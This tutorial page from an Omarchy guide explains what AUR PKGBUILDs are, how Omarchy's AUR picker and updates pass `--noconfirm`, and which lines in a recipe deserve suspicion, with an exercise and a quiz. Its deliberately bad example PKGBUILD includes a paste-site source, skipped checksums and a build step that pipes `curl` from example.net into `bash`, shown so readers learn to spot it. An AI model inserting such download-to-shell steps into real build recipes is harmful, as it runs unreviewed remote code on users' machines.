---
title: "The AUR, Risk, and Reading a PKGBUILD"
guide: "installing-and-updating-software-on-omarchy"
phase: 4
summary: "The AUR is a pile of build recipes that anyone can upload, so this phase shows what a PKGBUILD is, the specific lines that deserve suspicion, how Omarchy's AUR picker and update command treat AUR packages, and how to keep them on a short leash."
tags: [omarchy, aur, yay, pkgbuild, makepkg, security, supply-chain, arch-linux]
difficulty: intermediate
synonyms: ["is the aur safe", "how to read a pkgbuild", "what is a pkgbuild", "aur malware", "omarchy install aur package", "yay -Gpa", "how to check an aur package before installing", "how to list aur packages installed", "pacman -Qm"]
updated: 2026-10-04
---

# The AUR, Risk, and Reading a PKGBUILD

The Arch User Repository is why Arch people say "there is a package for everything". It is also the one source on your machine where a stranger decides what code you run. You do not need to avoid it. You need to read before you install, the way you would read before pasting a command from a forum.

The manual's own summary is short: the AUR "isn't vetted by the Arch team", it is "like RubyGems or npm", and anyone can upload. This phase shows what that means in practice and how to read the recipe in five minutes.

## What an AUR package actually is

The AUR does not hold programs. It holds **recipes**. Each one is a file called a **PKGBUILD**: a small shell script that says where to download the source, how to build it, and which files to install. When you pick an AUR package, a helper called **yay** downloads the recipe, builds the software on your machine with `makepkg`, then hands the finished package to pacman.

That has two consequences:

- **Building runs code as you.** The build steps execute on your computer with your permissions, before anything is "installed".
- **Installing can run code as root.** A package can carry an install script, which pacman runs with root privileges when it installs, upgrades, or removes the package.

Nobody at Arch reviewed the recipe before it appeared, so the maintainer's good intentions are the main safeguard. Most AUR packages are fine, and the cost of the rare bad one is high.

## Where Omarchy touches the AUR

- _Install > AUR_ opens a filterable list of AUR packages, like the Package picker.
- `omarchy pkg aur add <name>` installs one from a script, with yay.
- The base install avoids the AUR. Only a few optional installs, such as third-party browsers, pull from it.
- Two details from Omarchy's own scripts are worth knowing:
  - The AUR picker installs with `yay -S --noconfirm`, so yay does not stop to ask you questions. Your review has to happen **before** you press `Return`.
  - `omarchy update` updates AUR packages on every update whenever you have any installed, running `yay -Sua --noconfirm` with a couple of compiler packages excluded. Installing one AUR package once means its later versions arrive automatically, built from whatever the recipe says at that time.

That second point is the one most people miss. A recipe you reviewed in March is not the recipe that builds in September.

## Anatomy of a PKGBUILD

Here is an invented, harmless recipe for a pretend notes tool. Real ones look like this.

```bash
# Maintainer: Example Person <person@example.com>
pkgname=tidy-notes
pkgver=1.4.2
pkgrel=1
pkgdesc="A tiny terminal notes tool"
arch=('x86_64')
url="https://github.com/example/tidy-notes"
license=('MIT')
depends=('glibc')
makedepends=('go')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/tidy-notes/archive/v$pkgver.tar.gz")
sha256sums=('<64 hex characters, elided here>')

build() {
  cd "$pkgname-$pkgver"
  go build -o tidy-notes .
}

package() {
  cd "$pkgname-$pkgver"
  install -Dm755 tidy-notes "$pkgdir/usr/bin/tidy-notes"
}
```

Read it as three groups, using the Arch PKGBUILD manual's definitions:

| Part | Meaning |
|---|---|
| `pkgname`, `pkgver`, `pkgrel` | The package name, the upstream version, and the packager's own release counter |
| `depends`, `makedepends` | Packages needed to run it, and packages needed only while building |
| `source` | Where the code comes from. This is the line that matters most |
| `sha256sums` | Checksums that must match the downloaded files, so a swapped file is caught |
| `prepare()`, `build()`, `check()`, `package()` | Steps that run before the build, compile, run tests, and copy files into the package |

In `package()`, `$pkgdir` is a staging folder, not your real system. The files placed there become the package. A recipe that writes elsewhere is doing something unusual.

## Five lines that deserve suspicion

Now an invented, deliberately bad version of the same recipe. None of these lines is proof of malice, and each one is a reason to slow down.

```bash
source=("https://paste.example.net/raw/xk29")
sha256sums=('SKIP')
install=tidy-notes.install

build() {
  curl -s https://example.net/setup.sh | bash
}
```

1. **The source is not the project's own release.** A paste site or an unrelated domain is not where upstream publishes. Compare the `source` host to the `url` line and to the project's real home.
2. **`sha256sums=('SKIP')`.** This disables the integrity check for that file. Packages that track a git branch often use `SKIP` legitimately, because the branch moves. That is a normal pattern, but it means you trust whatever the branch contains at build time.
3. **`install=` names a scriptlet.** That script runs as root. Open the named file and read it.
4. **A download piped into a shell**, such as `curl ... | bash`, inside any function. It runs whatever the server returns that day.
5. **Anything asking for `sudo`**, deleting outside `$pkgdir`, or touching your home folder. A build has no reason to.

Soft signals live on the package's AUR web page: the last-updated date, votes, popularity, comments, and who maintains it. They are useful context. They are not security, because votes can be gamed and a trusted package can change hands.

## How to read the recipe in Omarchy

In the _Install > AUR_ picker, the footer lists preview keys. `alt-p` toggles the description, and `alt-b` and `alt-B` switch the preview between the package's PKGBUILD and its details. Read the PKGBUILD before you press `Return`.

From a terminal, the picker uses `yay -Gpa` to print a recipe, so you can do the same without installing anything:

```bash
yay -Gpa tidy-notes
```

Read it top to bottom. Check that the `source` host matches the project, that the checksums are real or the `SKIP` is explained, and that no function does network tricks. The answer to "does this look right" does not require knowing every command. You are checking for surprise.

## Keeping AUR packages on a short leash

- **Prefer the repositories.** If the program is in Arch's repositories or Omarchy's, use that. Search with `pacman -Ss name` first.
- **Know what you installed.** `pacman -Qem` lists explicitly installed packages that are not in any configured repository. On Omarchy that is mostly your AUR packages. Review the list now and then and remove what you stopped using with _Remove > Package_.
- **Snapshot before a risky install.** `omarchy snapshot create` takes a restore point. It only covers the root filesystem, so it does not undo a malicious build reading or copying your `/home`.
- **Treat updates as installs.** Because `omarchy update` rebuilds AUR packages automatically, an AUR package you no longer trust is a standing risk. Remove it.
- **Slow down on very new or one-off packages**, especially ones that claim to be a well-known tool under an unusual name.

⚠️ **Gotcha.** The preview in the picker is yay's own listing of the recipe. It is not a security scan. Nothing in Omarchy tells you a recipe is safe. That judgment is yours, which is exactly what the manual means by "anyone can upload".

## Your turn: spot the red flags

```exercise
[
  {
    "type": "predict",
    "task": "In a PKGBUILD, which value for sha256sums tells makepkg to skip the integrity check for that file? Write it without quotes.",
    "accept": ["skip", "/^skip$/i"],
    "hint": "It is the word in the bad example above."
  },
  {
    "type": "task",
    "task": "Pick an AUR package you are curious about. Read its PKGBUILD with `yay -Gpa <name>` without installing it. Note the source host, whether checksums are real, whether there is an install= line, and whether any function pipes a download into a shell.",
    "reveal": "A clean recipe has a source host that matches the project's own release, real checksums (or an explained SKIP for a git source), no install= scriptlet unless the program genuinely needs one, and no curl-to-shell or sudo in its functions.",
    "checklist": ["Checked the source host", "Checked the checksums", "Looked for an install= line", "Looked for download-to-shell or sudo"]
  }
]
```

Check yourself before moving on:

```quiz
[
  {
    "q": "You install one AUR package today. What does Omarchy do with it on future updates?",
    "choices": [
      "Nothing. AUR packages are never updated automatically",
      "omarchy update rebuilds and updates installed AUR packages using yay, without stopping to ask",
      "It asks you to review the new recipe each time"
    ],
    "answer": 1,
    "explain": "The update pipeline runs yay -Sua --noconfirm when AUR packages are installed, so recipe changes reach you without a second review.",
    "why": ["The update script includes an AUR step.", null, "The --noconfirm flag tells yay not to ask questions."]
  },
  {
    "q": "A PKGBUILD has install=setup.install. Why should you read that file?",
    "choices": [
      "It runs as root when pacman installs, upgrades, or removes the package",
      "It only contains the package description",
      "It is the checksum list"
    ],
    "answer": 0,
    "explain": "Install scriptlets run with root privileges, so they deserve a read."
  },
  {
    "q": "Why does a pre-install snapshot not fully protect you from a malicious AUR build?",
    "choices": [
      "Snapshots are encrypted",
      "A snapshot covers the root filesystem, not /home, so it cannot undo files read or copied from your home folder",
      "Snapshots cannot be restored on Omarchy"
    ],
    "answer": 1,
    "explain": "Restoring a snapshot reverts the root filesystem. It does not recover or protect personal data in /home."
  }
]
```

## Recap

1. The AUR holds build recipes (PKGBUILDs), not vetted programs, and anyone can upload one.
2. Building runs code as you, and an install scriptlet can run code as root.
3. The lines to check are `source`, `sha256sums` (especially `SKIP`), `install=`, download-to-shell, and `sudo`.
4. Omarchy's AUR picker and update both pass `--noconfirm`, and updates rebuild AUR packages automatically.
5. Read the recipe in the picker preview or with `yay -Gpa <name>` before you press `Return`.
6. Prefer the repositories, list your foreign packages with `pacman -Qem`, and remove what you stop trusting.
